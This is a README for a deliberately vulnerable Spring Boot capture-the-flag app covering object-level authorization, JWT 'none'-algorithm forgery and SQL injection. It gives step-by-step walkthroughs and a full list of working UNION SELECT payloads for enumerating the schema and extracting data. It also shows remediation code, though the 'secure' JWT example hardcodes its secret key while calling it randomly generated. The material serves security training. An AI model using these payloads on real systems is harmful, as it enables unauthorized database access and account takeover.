# Security CTF - OWASP Top 10 Challenge

This Spring Boot application is designed as a Capture The Flag (CTF) security challenge based on the OWASP Top 10
vulnerabilities. The current implementation includes challenges for **Broken Object Level Authorization**, **JWT Algorithm Confusion**, and **SQL Injection**.

## Vulnerability: Broken Object Level Authorization

The application contains a vulnerable endpoint that allows users to access profiles of other users without proper
authorization checks. This is a common security flaw where an application doesn't verify if the authenticated user has
the right to access the requested resource.

## Vulnerability: JWT Algorithm Confusion

The application accepts JWT tokens with "none" algorithm, allowing attackers to forge tokens without a signature.

## Vulnerability: SQL Injection

The application contains multiple vulnerable endpoints that allow SQL injection attacks:

### Description
L'application est vulnérable à différents types d'injections SQL.

### Implémentation
- **Endpoint de recherche vulnérable** : `/api/shop/search` - Recherche de produits avec injection SQL
- **Interface web** : `/shop.html` - Interface utilisateur pour tester la vulnérabilité

### Emplacement du Flag
Flag dans une table cachée `ctf_secrets` de la base de données, accessible uniquement via injection SQL.

### Scénario d'Attaque
1. Identifier le point d'entrée vulnérable dans l'endpoint `/api/shop/search`
2. Construire une injection SQL appropriée avec UNION SELECT (attention au format LIKE '%input%')
3. Extraire des données de tables non prévues (exploration via information_schema)
4. Récupérer le flag dans la table "ctf_secrets"

## How to Run

### Using Docker Compose (Recommended)

1. Clone the repository
2. Build and start the application with PostgreSQL:
   ```
   docker-compose up -d
   ```
3. Access the application at http://localhost:8080
4. To stop the application:
   ```
   docker-compose down
   ```

### Using Maven (Development)

1. Clone the repository
2. Make sure you have a PostgreSQL instance running and update `application.properties` if needed
3. Run the application using Maven:
   ```
   ./mvnw spring-boot:run
   ```
4. Access the application at http://localhost:8080

## API Documentation

The application includes OpenAPI documentation for the REST API:

- Swagger UI: http://localhost:8080/swagger-ui.html
- OpenAPI JSON: http://localhost:8080/api-docs

The Swagger UI provides an interactive interface to explore and test the API endpoints. It includes:

- Detailed information about each endpoint
- Request/response schemas
- Authentication requirements
- The ability to try out API calls directly from the browser

When the application starts, the Swagger UI URL is displayed in the logs for easy access.

## CTF Challenge Walkthrough

### Objective

Find the hidden flag in the admin user's profile.

### Steps to Solve

1. **Login as a regular user**

   Go to http://localhost:8080/user/me and login with

    - Username: `user`
    - Password: `password`

2. **Try to find the admin user ID**
    - After login, try to access your profile http://localhost:8080/api/users/{my_user_id}/profile
    - Do something else...

3. **Exploit the vulnerability**
    - Once you find the admin's user ID, access their profile using:
      ```
      /api/users/{admin_id}/profile
      ```
    - The flag is stored in the admin's `secretNote` field

## JWT Challenge Walkthrough

### Objective

Forge a JWT token to access the admin secret.

### Steps to Solve

1. **Get a JWT token**
    - Login via `/api/auth/login` with any user (e.g., user:password)
    - Copy the received JWT token

2. **Analyze and forge the token**
    - Decode the token on jwt.io
    - Change the algorithm to "none" in header: `{"alg":"none","typ":"JWT"}`
    - Change the role to "ADMIN" in payload: `{"role":"ADMIN",...}`
    - Remove the signature part (everything after the last dot)

3. **Access the admin secret**
    - Use the forged token to access `/api/auth/admin/secret`
    - The flag will be returned in the response

## SQL Injection Challenge Walkthrough

### Objective

Exploit SQL injection vulnerabilities to access the hidden flag in the `ctf_secrets` table.

### Steps to Solve

1. **Reconnaissance**
    - Test the search endpoint: `/api/shop/search?name=Laptop`
    - Note: Use "Laptop" with capital L to find "Laptop Dell XPS 13"

2. **Identify SQL injection points**
    - Try basic injection: `/api/shop/search?name=Laptop'`
    - Observe error messages that reveal SQL query structure
    - The query uses `LIKE '%input%'` format

3. **Determine number of columns**
    - Use ORDER BY technique: `/api/shop/search?name=Laptop' ORDER BY 1-- `
    - Continue until error: `/api/shop/search?name=Laptop' ORDER BY 6-- ` (should fail at 6, meaning 5 columns)

4. **Identify displayable columns and types**
    - The columns are: id (BIGINT), name (VARCHAR), price (DECIMAL), description (TEXT), category (VARCHAR)
    - Use UNION SELECT with correct types: `/api/shop/search?name=Laptop' UNION SELECT 999,'test',99.99,'description','category'-- `
    - Note which columns are displayed in the response

5. **Database reconnaissance**
    - Get database version: `/api/shop/search?name=Laptop' UNION SELECT 999,version(),99.99,'DB Version','info'-- `
    - Get current database: `/api/shop/search?name=Laptop' UNION SELECT 999,current_database(),99.99,'Current DB','info'-- `
    - List tables: `/api/shop/search?name=Laptop' UNION SELECT 999,table_name,99.99,'Table','info' FROM information_schema.tables WHERE table_schema='public'-- `

6. **Explore the secrets table**
    - List columns: `/api/shop/search?name=Laptop' UNION SELECT 999,column_name,99.99,'Column','info' FROM information_schema.columns WHERE table_name='ctf_secrets'-- `

7. **Extract the flag**
    - Get the flag: `/api/shop/search?name=Laptop' UNION SELECT 999,flag,99.99,description,'FLAG' FROM ctf_secrets WHERE challenge_name='sql_injection'-- `

### Complete Payload List

Here are all the working payloads for copy-paste testing:

#### Basic Tests
```
Laptop
Laptop'
```

#### Column Enumeration
```
Laptop' ORDER BY 1-- 
Laptop' ORDER BY 2-- 
Laptop' ORDER BY 3-- 
Laptop' ORDER BY 4-- 
Laptop' ORDER BY 5-- 
Laptop' ORDER BY 6--  
```
(The last one should error, confirming 5 columns)

#### UNION SELECT Tests
```
Laptop' UNION SELECT 999,'test',99.99,'description','category'-- 
```

#### Database Reconnaissance
```
Laptop' UNION SELECT 999,version(),99.99,'DB Version','info'-- 
Laptop' UNION SELECT 999,current_database(),99.99,'Current DB','info'-- 
Laptop' UNION SELECT 999,current_user(),99.99,'Current User','info'-- 
```

#### Table Discovery
```
Laptop' UNION SELECT 999,table_name,99.99,'Table','info' FROM information_schema.tables WHERE table_schema='public'-- 
```

#### Column Discovery
```
Laptop' UNION SELECT 999,column_name,99.99,'Column','info' FROM information_schema.columns WHERE table_name='products'-- 
Laptop' UNION SELECT 999,column_name,99.99,'Column','info' FROM information_schema.columns WHERE table_name='users'-- 
Laptop' UNION SELECT 999,column_name,99.99,'Column','info' FROM information_schema.columns WHERE table_name='ctf_secrets'-- 
```

#### Flag Extraction
```
Laptop' UNION SELECT 999,flag,99.99,description,'FLAG' FROM ctf_secrets WHERE challenge_name='sql_injection'-- 
```

#### Additional Data Extraction
```
Laptop' UNION SELECT 999,challenge_name,99.99,flag,'SECRET' FROM ctf_secrets-- 
```



### Web Interface

A user-friendly web interface is available at http://localhost:8080/shop.html

This interface provides:
- **Product search form** with vulnerable endpoint testing
- **Sample product searches** to test normal functionality
- **Real-time results** showing both successful queries and error messages
- **Clean interface** for manual SQL injection testing

The interface allows you to:
1. Test normal product searches (Laptop, iPhone, Book, Nike)
2. Manually craft and test SQL injection payloads
3. See detailed error messages that help with exploitation
4. Practice SQL injection techniques step by step

**Note:** The detailed payloads are provided in the walkthrough section below for educational purposes.

## Security Concepts Demonstrated

- **Broken Object Level Authorization**: The application fails to verify if the authenticated user has the right to
  access the requested resource.
- **Sensitive Data Exposure**: The vulnerable endpoint exposes sensitive user information including address, phone
  number, and secret notes.
- **JWT Algorithm Confusion**: Accepting "none" algorithm allows attackers to create unsigned tokens.
- **SQL Injection**: Direct string concatenation in SQL queries allows attackers to manipulate database queries and access unauthorized data.
- **Information Disclosure**: Error messages reveal database structure and query details to attackers.

## Proper Security Implementation

### Object Level Authorization

In a secure application, the endpoint should verify that the authenticated user has permission to access the requested
profile. For example:

```java
@GetMapping("/{id}/profile")
public ResponseEntity<User> getUserProfile(@PathVariable Long id, Authentication authentication) {
    // Get the current user
    User currentUser = userRepository.findByUsername(authentication.getName())
            .orElseThrow(() -> new UsernameNotFoundException("User not found"));

    // Check if the user is requesting their own profile or has admin rights
    if (!currentUser.getId().equals(id) && !"ADMIN".equals(currentUser.getRole())) {
        return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
    }

    // Proceed with fetching and returning the profile
    // ...
}
```

### Secure JWT Implementation

A secure JWT implementation should never accept the "none" algorithm and always verify signatures properly:

```java
@Service
public class SecureJwtService {
    
    // Use a strong, randomly generated secret key
    private final String SECRET_KEY = "myVeryLongSecretKeyForJWTSigning123456789";
    private final long EXPIRATION_TIME = 900000; // 15 minutes
    
    public String generateToken(String username, String role) {
        return Jwts.builder()
                .setSubject(username)
                .claim("role", role)
                .setIssuer("your-app")
                .setAudience("your-audience")
                .setIssuedAt(new Date())
                .setExpiration(new Date(System.currentTimeMillis() + EXPIRATION_TIME))
                .signWith(SignatureAlgorithm.HS256, SECRET_KEY)
                .compact();
    }
    
    public Claims validateToken(String token) {
        return Jwts.parserBuilder()
                .setSigningKey(SECRET_KEY)
                .requireIssuer("your-app")
                .requireAudience("your-audience")
                .build()
                .parseClaimsJws(token) // Always verify signature
                .getBody();
    }
}
```

**Key security principles for JWT:**
- **Never accept "none" algorithm**
- **Always verify signatures** with a strong secret key
- **Use short expiration times** (15-30 minutes)
- **Implement token refresh** mechanisms
- **Validate all claims** (issuer, audience, expiration)
- **Use HTTPS only** in production
- **Store tokens securely** on the client side

### Secure SQL Implementation

A secure SQL implementation should always use prepared statements and parameterized queries:

```java
@GetMapping("/search")
public ResponseEntity<?> searchProductsSecure(@RequestParam String productName) {
    try (Connection connection = dataSource.getConnection()) {
        // SECURE: Use prepared statement with parameters
        String query = "SELECT id, name, price, description, category FROM products WHERE name LIKE ?";
        
        PreparedStatement statement = connection.prepareStatement(query);
        statement.setString(1, "%" + productName + "%");
        ResultSet resultSet = statement.executeQuery();
        
        // Process results...
        
    } catch (Exception e) {
        // SECURE: Don't expose internal error details
        return ResponseEntity.status(500).body(Map.of("error", "Search failed"));
    }
}
```

**Key security principles for SQL:**
- **Always use prepared statements** with parameterized queries
- **Never concatenate user input** directly into SQL strings
- **Validate and sanitize input** before processing
- **Use least privilege** database accounts
- **Don't expose database errors** to end users
- **Implement proper logging** for security monitoring
- **Use stored procedures** when appropriate
- **Apply input length limits** to prevent buffer overflows

## Additional Notes

This application is intentionally vulnerable for educational purposes. Do not use this code in production environments.
